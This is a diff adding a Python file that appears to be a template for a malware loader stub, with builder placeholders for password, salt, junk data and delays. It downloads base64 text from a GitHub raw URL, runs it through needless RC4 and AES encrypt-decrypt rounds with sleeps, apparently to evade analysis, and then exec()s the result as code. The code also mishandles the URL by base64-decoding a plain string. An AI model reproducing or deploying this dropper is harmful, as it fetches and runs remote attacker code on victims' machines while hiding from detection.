@@ -1,0 +1,89 @@
+import os, sys, base64, time, http.client, uuid, subprocess, ctypes, platform, sys
+from urllib.parse import urlparse
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding, hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+def derive_key(password, salt, length=32):
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),  
+        length=length,
+        salt=salt,
+        iterations=100000,
+        backend=default_backend()
+    )
+    return kdf.derive(password.encode())  
+
+def aes_encrypt(key, data):
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+    return encrypted_data, iv
+
+def aes_decrypt(key, encrypted_data, iv):
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
+    unpadder = padding.PKCS7(128).unpadder()
+    return unpadder.update(decrypted_data) + unpadder.finalize()
+
+def rc4_encrypt(key, data):
+    if isinstance(key, str): key = key.encode()
+    if isinstance(data, str): data = data.encode()
+    S = list(range(256))
+    j = 0
+    out = []
+    key = list(key)
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    i = j = 0
+    for char in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        out.append(char ^ S[(S[i] + S[j]) % 256])
+    return bytes(out)
+    
+def rc4_decrypt(key, data):
+    return rc4_encrypt(key, data)
+
+def download(url):
+    u = urlparse(url)
+    conn = http.client.HTTPSConnection(u.netloc)
+    conn.request("GET", u.path)
+    res = conn.getresponse()
+    return res.read() if res.status == 200 else None
+
+password = {repr(password)}
+salt = base64.b64decode({repr(base64.b64encode(salt).decode())})
+aes_key = derive_key(password, salt)
+rc4_key = derive_key(password, salt, length=16)
+
+junk = '{junk_b64}'
+file_url = 'https://raw.githubusercontent.com/whupsxd/asasa/refs/heads/main/loliiiiii.txt'
+
+data = download(base64.b64decode(file_url))
+
+if data:
+    decoded_data = base64.b64decode(data)
+    time.sleep({delay})
+
+    rc4_encrypted = rc4_encrypt(rc4_key, decoded_data)
+    time.sleep({delay})
+
+    aes_encrypted, iv = aes_encrypt(aes_key, rc4_encrypted)
+    time.sleep({delay})
+
+    aes_decrypted = aes_decrypt(aes_key, aes_encrypted, iv)
+    time.sleep({delay})
+
+    rc4_decrypted = rc4_decrypt(rc4_key, aes_decrypted)
+    time.sleep({delay})
+
+    final_code = rc4_decrypted.decode('utf-8')
+    exec(final_code)
